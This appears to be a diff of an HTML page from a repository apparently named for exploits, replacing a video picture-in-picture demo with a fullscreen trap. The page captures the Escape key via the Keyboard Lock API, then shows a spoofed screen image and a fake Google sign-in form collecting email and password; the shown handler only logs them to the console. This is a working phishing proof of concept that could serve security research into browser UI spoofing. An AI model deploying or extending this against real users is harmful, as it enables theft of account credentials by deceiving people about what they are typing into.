@@ -1,156 +1,402 @@
 <!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video PiP dengan Button Pop-Up (Max Size)</title>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Fullscreen Pointer Lock with Auto ESC Lock</title>
     <style>
-        body {
-            margin: 0;
-            height: 100vh;
-            background: #000;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            font-family: Arial, sans-serif;
-            color: white;
-        }
-        video {
-            max-width: 90%;
-            max-height: 60vh;
-            border: 2px solid #333;
-            border-radius: 8px;
-        }
-        button {
-            margin-top: 20px;
-            padding: 12px 24px;
-            font-size: 16px;
-            background: #007bff;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-        }
-        button:hover {
-            background: #0056b3;
-        }
-        .pip-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 10px;
-            background: #222;
-            border-radius: 8px;
-            width: 100%;
-            height: 100%;
-        }
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        overflow: hidden;
+        background-color: #f0f0f0;
+        font-family: Arial, sans-serif;
+      }
+      #container {
+        position: relative;
+        width: 100vw;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+      canvas {
+        display: block;
+        width: 100vw;
+        height: 100vh;
+        cursor: pointer;
+        background-color: #e0e0e0;
+      }
+      #ui-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        padding: 20px;
+        background: linear-gradient(to bottom, rgba(0,0,0,0.7), transparent);
+        color: white;
+        z-index: 999;
+        pointer-events: none;
+        transition: opacity 0.3s;
+      }
+      #ui-overlay.hidden {
+        opacity: 0;
+      }
+      #status {
+        font-size: 18px;
+        margin-bottom: 10px;
+        text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+      }
+      #esc-status {
+        font-size: 16px;
+        text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+      }
+      #instructions {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: rgba(0, 0, 0, 0.8);
+        color: white;
+        padding: 40px;
+        border-radius: 10px;
+        text-align: center;
+        z-index: 1001;
+        transition: opacity 0.3s;
+      }
+      #instructions.hidden {
+        display: none;
+      }
+      #instructions h2 {
+        margin-bottom: 20px;
+        font-size: 24px;
+      }
+      #instructions p {
+        margin-bottom: 10px;
+        font-size: 16px;
+      }
+      #image-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background-color: transparent;
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
+      #image-overlay img {
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
+      }
+      /* Styles for Fake Google Login Popup */
+      #google-login-popup {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent backdrop */
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 1002; /* Above image-overlay */
+      }
+      #google-login-modal {
+        background-color: white;
+        padding: 30px;
+        border-radius: 10px;
+        text-align: center;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        max-width: 400px;
+        width: 90%;
+        font-family: 'Roboto', sans-serif; /* Mimic Google font */
+      }
+      #google-login-modal .logo {
+        font-size: 24px;
+        font-weight: bold;
+        color: #4285F4; /* Google blue */
+        margin-bottom: 20px;
+      }
+      #google-login-modal h3 {
+        margin-bottom: 20px;
+        font-size: 20px;
+      }
+      #google-login-modal input {
+        width: 100%;
+        padding: 10px;
+        margin: 10px 0;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+      }
+      #google-login-modal button {
+        background-color: #4285F4;
+        color: white;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px;
+      }
+      #google-login-modal button:hover {
+        background-color: #357ae8;
+      }
+      #google-login-modal .close-btn {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        font-size: 24px;
+        cursor: pointer;
+        color: #aaa;
+      }
+      #google-login-modal .close-btn:hover {
+        color: #000;
+      }
     </style>
-</head>
-<body>
-    <video id="myVideo" controls autoplay muted loop playsinline>
-        <source src="https://0x1337-exploit.github.io/hosting/staging/ado.mp4" type="video/mp4">
-        Browser Anda tidak mendukung pemutaran video.
-    </video>
-
-    <button onclick="enterCustomPiP()">Masuk Mode PiP dengan Pop-Up Button (Max Size ~80%)</button>
-
+  </head>
+  <body>
+    <div id="container">
+      <div id="instructions">
+        <h2>Pointer Lock Instructions</h2>
+        <p><strong>Click anywhere</strong> to enter full screen & pointer lock</p>
+        <p>The ESC key will be <strong>locked automatically</strong> when full screen</p>
+        <p>Press <strong>ESC</strong> to display the image</p>
+        <p>Move the mouse to move the red box</p>
+      </div>
+      <canvas id="canvas"></canvas>
+      <div id="ui-overlay">
+        <div id="status">
+          Click the screen to lock pointer & enter fullscreen
+        </div>
+        <div id="esc-status">ESC Key: Not Locked</div>
+      </div>
+      <div id="image-overlay">
+        <img src="https://0x1337-exploit.github.io/hosting/staging/spoof.png" alt="Displayed Image" />
+      </div>
+      <!-- Fake Google Login Popup -->
+      <div id="google-login-popup">
+        <div id="google-login-modal">
+          <span class="close-btn" onclick="hideGooglePopup()">&times;</span>
+          <div class="logo">Google</div>
+          <h3>Sign in</h3>
+          <p>Use your Google Account</p>
+          <form onsubmit="handleFakeLogin(event)">
+            <input type="email" placeholder="Email or phone" required />
+            <input type="password" placeholder="Password" required />
+            <button type="submit">Next</button>
+          </form>
+        </div>
+      </div>
+    </div>
     <script>
-        let pipWindow = null;
-
-        async function enterCustomPiP() {
-            const video = document.getElementById('myVideo');
-
-            // Hitung ukuran maksimal ~80% screen (untuk mendekati batas browser)
-            const maxWidth = Math.floor(window.screen.width * 0.8);
-            const maxHeight = Math.floor(window.screen.height * 0.8);
-
-            // Cek dukungan Document PiP
-            if ('documentPictureInPicture' in window) {
-                try {
-                    // Request jendela PiP dengan ukuran maksimal diizinkan
-                    pipWindow = await documentPictureInPicture.requestWindow({
-                        width: maxWidth,
-                        height: maxHeight
-                    });
-
-                    // Buat container di dalam PiP
-                    const container = pipWindow.document.createElement('div');
-                    container.className = 'pip-container';
-
-                    // Pindahkan video ke PiP (clone)
-                    const clonedVideo = video.cloneNode(true);
-                    clonedVideo.play();
-                    clonedVideo.style.maxWidth = '100%';
-                    clonedVideo.style.maxHeight = '80%';
-
-                    // Button pop-up
-                    const popupButton = pipWindow.document.createElement('button');
-                    popupButton.textContent = 'Klik untuk Pop-Up';
-                    popupButton.onclick = () => {
-                        alert('Ini adalah pop-up dari dalam PiP!');
-                    };
-
-                    // Button baru: Coba masuk fullscreen (jika didukung di PiP)
-                    const fullscreenButton = pipWindow.document.createElement('button');
-                    fullscreenButton.textContent = 'Coba Fullscreen di PiP';
-                    fullscreenButton.onclick = () => {
-                        if (pipWindow.document.documentElement.requestFullscreen) {
-                            pipWindow.document.documentElement.requestFullscreen()
-                                .then(() => console.log('Fullscreen berhasil'))
-                                .catch(err => alert('Gagal fullscreen: ' + err.message));
-                        } else {
-                            alert('Browser tidak mendukung fullscreen di PiP.');
-                        }
-                    };
-
-                    // Tambahkan elemen
-                    container.appendChild(clonedVideo);
-                    container.appendChild(popupButton);
-                    container.appendChild(fullscreenButton);
-
-                    // Style untuk PiP
-                    const style = pipWindow.document.createElement('style');
-                    style.textContent = `
-                        body { margin: 0; background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; width: 100vw; overflow: hidden; }
-                        .pip-container { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 10px; background: #222; border-radius: 8px; width: 100%; height: 100%; box-sizing: border-box; }
-                        video { width: 100%; height: auto; max-height: 70%; object-fit: contain; }
-                        button { margin-top: 10px; padding: 8px 16px; background: #ff5722; color: white; border: none; border-radius: 4px; cursor: pointer; }
-                        button:hover { background: #e64a19; }
-                    `;
-                    pipWindow.document.head.appendChild(style);
-
-                    pipWindow.document.body.appendChild(container);
-
-                    // Handle keluar
-                    pipWindow.addEventListener('pagehide', () => {
-                        pipWindow = null;
-                        video.play();
-                    });
-                } catch (err) {
-                    alert("Gagal masuk Document PiP: " + err.message + ". Browser mungkin batasi ukuran.");
-                    enterStandardPiP();
-                }
-            } else {
-                alert("Browser tidak mendukung Document Picture-in-Picture.");
-                enterStandardPiP();
-            }
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+      const escStatus = document.getElementById("esc-status");
+      const statusDiv = document.getElementById("status");
+      const uiOverlay = document.getElementById("ui-overlay");
+      const instructions = document.getElementById("instructions");
+      const imageOverlay = document.getElementById("image-overlay");
+      const googleLoginPopup = document.getElementById("google-login-popup");
+     
+      let isEscLocked = false;
+      let isFullscreen = false;
+      let x, y;
+      // Set canvas size to match window size
+      function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        // Center position
+        x = canvas.width / 2;
+        y = canvas.height / 2;
+        draw();
+      }
+      // Initialize
+      resizeCanvas();
+      window.addEventListener("resize", resizeCanvas);
+      // Request pointer lock and fullscreen on click anywhere on canvas
+      canvas.addEventListener("click", async () => {
+        try {
+          // Hide instructions
+          instructions.classList.add("hidden");
+         
+          // Request fullscreen first
+          await document.documentElement.requestFullscreen();
+          isFullscreen = true;
+         
+          // Automatically lock ESC key immediately after entering fullscreen
+          await lockEsc();
+         
+          // Then pointer lock
+          canvas.requestPointerLock =
+            canvas.requestPointerLock ||
+            canvas.mozRequestPointerLock ||
+            canvas.webkitRequestPointerLock;
+          canvas.requestPointerLock();
+         
+          statusDiv.textContent = "Pointer Locked - Move mouse to move";
+         
+          // Hide UI after a moment
+          setTimeout(() => {
+            uiOverlay.classList.add("hidden");
+          }, 2000);
+        } catch (err) {
+          console.error("Failed to enter fullscreen or pointer lock:", err);
         }
-
-        function enterStandardPiP() {
-            const video = document.getElementById('myVideo');
-            if (document.pictureInPictureEnabled && video.requestPictureInPicture) {
-                video.requestPictureInPicture()
-                    .then(() => console.log("Berhasil masuk PiP standar"))
-                    .catch(err => alert("Gagal masuk PiP standar: " + err.message));
-            } else {
-                alert("Browser Anda tidak mendukung Picture-in-Picture.");
-            }
+      });
+      // Handle pointer lock change
+      document.addEventListener("pointerlockchange", lockChangeAlert, false);
+      document.addEventListener("mozpointerlockchange", lockChangeAlert, false);
+      document.addEventListener("webkitpointerlockchange", lockChangeAlert, false);
+      // Handle fullscreen change
+      document.addEventListener("fullscreenchange", fullscreenChangeAlert, false);
+      document.addEventListener("mozfullscreenchange", fullscreenChangeAlert, false);
+      document.addEventListener("webkitfullscreenchange", fullscreenChangeAlert, false);
+      function lockChangeAlert() {
+        if (
+          document.pointerLockElement === canvas ||
+          document.mozPointerLockElement === canvas ||
+          document.webkitPointerLockElement === canvas
+        ) {
+          console.log("Pointer locked");
+          document.addEventListener("mousemove", updatePosition, false);
+          document.addEventListener("keydown", handleKeyDown, false);
+          uiOverlay.classList.remove("hidden");
+        } else {
+          console.log("Pointer not locked");
+          document.removeEventListener("mousemove", updatePosition, false);
+          document.removeEventListener("keydown", handleKeyDown, false);
+         
+          if (isEscLocked) {
+            unlockEsc();
+          }
+         
+          // Exit fullscreen if pointer unlocks
+          if (document.fullscreenElement) {
+            document.exitFullscreen();
+          }
+         
+          hideImageOverlay();
+          hideGooglePopup();
+          uiOverlay.classList.remove("hidden");
+          statusDiv.textContent = "Click the screen to lock pointer & enter fullscreen";
+          instructions.classList.remove("hidden");
         }
-
-        // Pastikan video siap
-        const video = document.getElementById('myVideo');
-        video.play().catch(() => console.log("Autoplay dicegah"));
+      }
+      function fullscreenChangeAlert() {
+        if (!document.fullscreenElement) {
+          isFullscreen = false;
+          console.log("Exited fullscreen");
+         
+          // Exit pointer lock if fullscreen exits
+          if (document.pointerLockElement) {
+            document.exitPointerLock();
+          }
+         
+          if (isEscLocked) {
+            unlockEsc();
+          }
+         
+          hideImageOverlay();
+          hideGooglePopup();
+        }
+      }
+      // Track mouse movement
+      function updatePosition(e) {
+        x += e.movementX;
+        y += e.movementY;
+       
+        // Keep within bounds
+        x = Math.max(0, Math.min(canvas.width, x));
+        y = Math.max(0, Math.min(canvas.height, y));
+       
+        draw();
+      }
+      // Draw
+      function draw() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+       
+        // Draw crosshair
+        ctx.strokeStyle = "rgba(255, 255, 255, 0.3)";
+        ctx.lineWidth = 1;
+        ctx.beginPath();
+        ctx.moveTo(x, 0);
+        ctx.lineTo(x, canvas.height);
+        ctx.moveTo(0, y);
+        ctx.lineTo(canvas.width, y);
+        ctx.stroke();
+       
+        // Draw red square
+        ctx.fillStyle = "red";
+        ctx.fillRect(x - 10, y - 10, 20, 20);
+      }
+      // Handle keydown - ESC shows image when locked
+      async function handleKeyDown(e) {
+        if (e.key === "Escape" && isEscLocked) {
+          // ESC is locked, so show image overlay and fake Google login popup
+          console.log("ESC pressed while locked - displaying image and fake Google login");
+          showImageOverlay();
+          showGooglePopup();
+          e.preventDefault();
+        }
+      }
+      // Lock Esc - called automatically on fullscreen
+      async function lockEsc() {
+        try {
+          if ("keyboard" in navigator && isFullscreen) {
+            await navigator.keyboard.lock(["Escape"]);
+            isEscLocked = true;
+            escStatus.textContent = "ESC Key: Locked ✓ (Press ESC for image)";
+            console.log("ESC key automatically locked");
+          } else {
+            console.log("Keyboard Lock API not supported or not in fullscreen");
+          }
+        } catch (err) {
+          console.error("Failed to lock ESC:", err);
+        }
+      }
+      // Unlock Esc
+      function unlockEsc() {
+        if ("keyboard" in navigator) {
+          navigator.keyboard.unlock();
+          isEscLocked = false;
+          escStatus.textContent = "ESC Key: Not Locked";
+          console.log("ESC key unlocked");
+        }
+      }
+      // Show image overlay
+      function showImageOverlay() {
+        imageOverlay.style.display = "flex";
+      }
+      // Hide image overlay
+      function hideImageOverlay() {
+        imageOverlay.style.display = "none";
+      }
+      // Show fake Google login popup
+      function showGooglePopup() {
+        googleLoginPopup.style.display = "flex";
+      }
+      // Hide fake Google login popup
+      function hideGooglePopup() {
+        googleLoginPopup.style.display = "none";
+      }
+      // Handle fake login submit
+      function handleFakeLogin(event) {
+        event.preventDefault();
+        // Simulate login action (e.g., log credentials to console - for demo only)
+        const email = event.target[0].value;
+        const password = event.target[1].value;
+        console.log(`Fake login: Email=${email}, Password=${password}`);
+        alert("Login submitted (fake)!");
+        hideGooglePopup(); // Close popup after submit
+      }
+      draw();
     </script>
-</body>
+  </body>
 </html>
